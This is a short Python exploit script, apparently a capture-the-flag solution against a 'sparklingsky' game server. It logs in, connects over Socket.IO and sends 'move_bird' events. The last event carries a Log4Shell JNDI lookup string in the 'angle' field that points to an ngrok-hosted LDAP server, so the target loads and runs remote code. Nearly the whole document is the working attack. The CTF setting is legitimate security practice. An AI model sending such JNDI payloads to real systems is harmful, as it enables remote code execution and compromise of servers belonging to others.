import time

import socketio
import requests

URL = 'http://sparklingsky.challs.srdnlen.it:8081'
# URL = 'http://127.0.0.1:80'

s =requests.Session()

r = s.post(f'{URL}/login', data={'username':'user1337','password':'user1337'})
r.raise_for_status()

assert 'Join Game' in r.text

# standard Python
with socketio.SimpleClient() as sio:
    sio.connect(URL, headers={
        'Cookie': f'session={s.cookies["session"]}'
    })

    s = sio.receive()
    print(s)

    sio.emit('move_bird', {
        'user_id': 1,
        'x': 1,
        'y': 1,
        'angle': 'hello sir'
    })

    s = sio.receive()
    print(s)

    time.sleep(1)

    sio.emit('move_bird', {
        'user_id': 1,
        'x': 10000000000,
        'y': 10000000000,
        'angle': '${jndi:ldap://173a-93-70-85-227.ngrok-free.app:1389/a}'
    })

    s = sio.receive()
    print(s)